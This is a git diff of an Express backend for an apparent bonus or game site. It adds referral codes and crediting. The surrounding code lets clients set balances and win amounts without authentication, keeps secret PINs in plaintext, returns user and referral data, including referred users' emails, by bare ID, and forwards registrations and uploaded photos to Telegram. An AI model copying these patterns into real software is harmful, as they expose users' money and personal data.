@@ -1,3 +1,4 @@
+// backend/server.js
 require('dotenv').config();
 const express = require('express');
 const fs = require('fs');
@@ -30,6 +31,14 @@ const upload = multer({ dest: uploadDir });
 function readUsers(){ return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); }
 function writeUsers(u){ fs.writeFileSync(USERS_FILE, JSON.stringify(u, null, 2)); }
 
+function makeReferralCode(){
+  // REF- + 6 uppercase alphanum
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let s = '';
+  for(let i=0;i<6;i++) s += chars.charAt(Math.floor(Math.random()*chars.length));
+  return 'REF-' + s;
+}
+
 async function telegramNotify(text, photoPath){
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -48,21 +57,73 @@ async function telegramNotify(text, photoPath){
   }catch(e){ console.error('Telegram error', e.message); }
 }
 
-// Register (multipart)
+// Register (multipart) - accepts referralCode
 app.post('/api/register', upload.single('profilePic'), async (req, res) => {
   try{
     const body = req.body;
-    const { firstName,lastName,username,email,password,secretPin,phone,sex,birthday,address } = body;
+    const { firstName,lastName,username,email,password,secretPin,phone,sex,birthday,address, referralCode } = body;
     if(!username || !email || !password || !secretPin) return res.status(400).json({ error: 'Missing fields' });
+
     const users = readUsers();
     if(users.find(u => u.username === username || u.email === email)) return res.status(400).json({ error: 'User exists' });
+
     const hashed = await bcrypt.hash(password, 10);
-    const profileUrl = req.file ? `/uploads/${path.basename(req.file.path)}` : null;
-    const user = { id: uuidv4(), firstName, lastName, username, email, password: hashed, secretPin, phone, sex, birthday, address, profileUrl, balance:0, hasWonBigBonus:false, createdAt: new Date().toISOString() };
+    let profileUrl = null;
+    if(req.file) profileUrl = `/uploads/${path.basename(req.file.path)}`;
+
+    // create unique referralCode for this new user
+    let myReferral = makeReferralCode();
+    // ensure uniqueness
+    while(users.find(u => u.referralCode === myReferral)) myReferral = makeReferralCode();
+
+    const user = {
+      id: uuidv4(),
+      firstName,
+      lastName,
+      username,
+      email,
+      password: hashed,
+      secretPin,
+      phone,
+      sex,
+      birthday,
+      address,
+      profileUrl,
+      balance: 0,
+      hasWonBigBonus: false,
+      createdAt: new Date().toISOString(),
+
+      // referral fields
+      referralCode: myReferral,       // this user's code to share
+      referredBy: referralCode || null, // the code used when registering (may be null)
+      referrals: [],                  // list of referred user objects { id, username, date }
+      referralEarned: 0               // total earned from referrals
+    };
+
     users.push(user);
+
+    // handle referral crediting (only if referralCode provided)
+    if(referralCode){
+      const referrer = users.find(u => u.referralCode === referralCode);
+      if(referrer && referrer.id !== user.id && referrer.email !== user.email){
+        // ensure we don't credit twice for same referred email/username
+        const already = referrer.referrals && referrer.referrals.find(r => r.email === user.email || r.username === user.username);
+        if(!already){
+          // credit $30
+          referrer.balance = (referrer.balance || 0) + 30;
+          referrer.referralEarned = (referrer.referralEarned || 0) + 30;
+          referrer.referrals = referrer.referrals || [];
+          referrer.referrals.push({ id: user.id, username: user.username, email: user.email, date: new Date().toISOString() });
+        }
+      }
+    }
+
     writeUsers(users);
-    telegramNotify(`<b>New registration</b>\nUser: ${username}\nEmail: ${email}`, req.file ? req.file.path : null);
-    res.json({ ok:true, userId: user.id });
+    telegramNotify(`<b>New registration</b>\nUser: ${username}\nEmail: ${email}\nReferral used: ${referralCode || 'none'}`, req.file ? req.file.path : null);
+
+    const { password:pw, secretPin:pin, ...publicUser } = user;
+    res.json({ ok:true, user: publicUser });
+
   }catch(e){ console.error(e); res.status(500).json({ error: 'Server error' }); }
 });
 
@@ -81,7 +142,7 @@ app.post('/api/login', async (req, res) => {
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
-// Forgot/reset
+// Forgot/reset (unchanged)
 app.post('/api/forgot', async (req, res) => {
   try{
     const { email, secretPin, newPassword } = req.body;
@@ -97,7 +158,7 @@ app.post('/api/forgot', async (req, res) => {
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
-// Add bonus
+// Add bonus (unchanged)
 app.post('/api/add-bonus', (req, res) => {
   try{
     const { userId, amount } = req.body;
@@ -109,7 +170,7 @@ app.post('/api/add-bonus', (req, res) => {
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
-// Play
+// Play (unchanged, respects hasWonBigBonus)
 app.post('/api/play', (req, res) => {
   try{
     const { userId, winAmount, triggeredBigBonus } = req.body;
@@ -129,7 +190,7 @@ app.post('/api/play', (req, res) => {
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
-// Winner submit (files forwarded to Telegram)
+// Winner submit (unchanged)
 app.post('/api/winner-submit', upload.fields([{ name:'picture' }, { name:'laugh' }]), (req, res) => {
   try{
     const { fullname, userId } = req.body;
@@ -141,13 +202,29 @@ app.post('/api/winner-submit', upload.fields([{ name:'picture' }, { name:'laugh'
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
-// Get user
+// Get user (unchanged)
 app.get('/api/user/:id', (req, res) => {
   try{
     const users = readUsers(); const user = users.find(u => u.id === req.params.id);
     if(!user) return res.status(404).json({ error: 'Not found' });
     const { password, secretPin, ...pub } = user;
     res.json(pub);
+  }catch(e){ res.status(500).json({ error: 'Server error' }); }
+});
+
+// --- NEW: referrals endpoint (returns user's referral data)
+app.get('/api/referrals/:id', (req, res) => {
+  try{
+    const users = readUsers();
+    const user = users.find(u => u.id === req.params.id);
+    if(!user) return res.status(404).json({ error: 'User not found' });
+    const data = {
+      referralCode: user.referralCode || null,
+      referralLink: user.referralCode ? `${process.env.FRONTEND_ORIGIN || 'https://your-vercel-app.vercel.app'}/register.html?ref=${user.referralCode}` : null,
+      referralEarned: user.referralEarned || 0,
+      referrals: user.referrals || []
+    };
+    res.json({ ok:true, data });
   }catch(e){ res.status(500).json({ error: 'Server error' }); }
 });
 
